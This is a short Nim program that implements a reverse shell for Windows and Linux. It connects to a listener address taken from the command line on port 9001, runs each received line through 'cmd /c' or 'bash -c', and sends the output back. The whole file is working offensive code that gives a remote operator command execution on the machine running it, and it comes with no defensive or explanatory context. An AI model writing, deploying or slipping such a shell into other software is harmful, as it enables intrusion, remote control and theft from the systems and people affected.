import os
import net
import osproc

#Create a new variable called socket
var socket = newSocket()

proc shell(listener: string, port: int): void =

    when system.hostOS == "windows":
        echo "Running Windows Rev Shell"

        try:
            socket.connect(listener, PORT(port))

            while true:
                let cmd = socket.recvLine()
                if cmd == "exit":
                    break
                let result = execProcess("cmd /c " & cmd)
                socket.send(result)

        #THIS WILL
        except:
            raise
        finally:
            socket.close

    when system.hostOS == "linux":
        echo "Running Linux Reverse Shell"

        try:
            socket.connect(listener, PORT(port))

            while true:
                let cmd = socket.recvLine()
                if cmd == "exit":
                    break
                let result = execProcess("bash -c " & cmd)
                socket.send(result)
        except:
            raise
        finally:
            socket.close


when isMainModule:
    try:
        let port = 9001
        let listener = paramStr(1)
        shell(listener, port)
    except:
        raise
